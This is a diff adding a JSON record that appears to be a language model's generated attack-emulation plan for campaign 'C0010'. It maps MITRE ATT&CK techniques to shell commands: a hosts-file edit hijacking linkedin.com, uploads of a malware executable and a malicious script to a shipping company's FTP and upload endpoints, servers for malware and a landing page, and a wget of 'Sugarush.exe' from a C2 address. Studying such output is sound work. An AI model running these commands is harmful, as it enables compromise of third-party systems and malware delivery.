@@ -1,0 +1,104 @@
+{
+  "campaign_id": "C0010",
+  "model": "gpt-oss:20b",
+  "sample": 1,
+  "temperature": 0.7,
+  "realizations": [
+    {
+      "technique_id": "T1583.001",
+      "mechanism": "edit-hosts-file",
+      "command": "sudo sh -c 'echo \"10.0.0.5 linkedin.com\" >> /etc/hosts'",
+      "target": "actor.primary",
+      "parameters": {
+        "domain": "linkedin.com",
+        "ip_address": "10.0.0.5"
+      }
+    },
+    {
+      "technique_id": "T1584.001",
+      "mechanism": "ftp-upload",
+      "command": "curl -T /tmp/malware_exploit_payload.exe ftp://shippingcompany.com/public/ --user anonymous:",
+      "target": "endpoint.public_service",
+      "parameters": {
+        "url": "ftp://shippingcompany.com/public/",
+        "file_path": "/tmp/malware_exploit_payload.exe",
+        "user": "anonymous",
+        "password": ""
+      }
+    },
+    {
+      "technique_id": "T1587.001",
+      "mechanism": "wget-download",
+      "command": "wget -O /tmp/Sugarush.exe https://example.com/sugarush.exe",
+      "target": "actor.primary",
+      "parameters": {
+        "url": "https://example.com/sugarush.exe",
+        "destination_path": "/tmp/Sugarush.exe"
+      }
+    },
+    {
+      "technique_id": "T1588.002",
+      "mechanism": "git-clone",
+      "command": "git clone https://github.com/rapid7/metasploit-framework.git /tmp/metasploit",
+      "target": "actor.primary",
+      "parameters": {
+        "repo_url": "https://github.com/rapid7/metasploit-framework.git",
+        "dest_dir": "/tmp/metasploit"
+      }
+    },
+    {
+      "technique_id": "T1608.001",
+      "mechanism": "http-server-malware",
+      "command": "python3 -m http.server --directory /tmp/malware 8000 &",
+      "target": "actor.primary",
+      "parameters": {
+        "directory": "/tmp/malware",
+        "port": 8000
+      }
+    },
+    {
+      "technique_id": "T1608.002",
+      "mechanism": "http-server-tools",
+      "command": "python3 -m http.server --directory /tmp/tools 8001 &",
+      "target": "actor.primary",
+      "parameters": {
+        "directory": "/tmp/tools",
+        "port": 8001
+      }
+    },
+    {
+      "technique_id": "T1608.004",
+      "mechanism": "upload-redirect-js",
+      "command": "curl -F 'file=@/tmp/malicious.js' http://shippingcompany.com/upload.php",
+      "target": "endpoint.public_service",
+      "parameters": {
+        "url": "http://shippingcompany.com/upload.php",
+        "file_path": "/tmp/malicious.js"
+      }
+    },
+    {
+      "technique_id": "T1189",
+      "mechanism": "serve-malicious-landing",
+      "command": "python3 -m http.server --directory /tmp/landing 80 &",
+      "target": "actor.primary",
+      "parameters": {
+        "directory": "/tmp/landing",
+        "port": 80
+      }
+    },
+    {
+      "technique_id": "T1105",
+      "mechanism": "wget-from-c2",
+      "command": "wget http://10.0.0.5:8000/Sugarush.exe -O /tmp/Sugarush.exe",
+      "target": "target.primary",
+      "parameters": {
+        "url": "http://10.0.0.5:8000/Sugarush.exe",
+        "destination_path": "/tmp/Sugarush.exe"
+      }
+    }
+  ],
+  "raw_proposal_keys": [
+    "realizations"
+  ],
+  "response_sha256": "01708997b9c3456aa7b1f90fb07d0c35d4e6b9fd0c70c1023ab33cf0902e9215"
+}
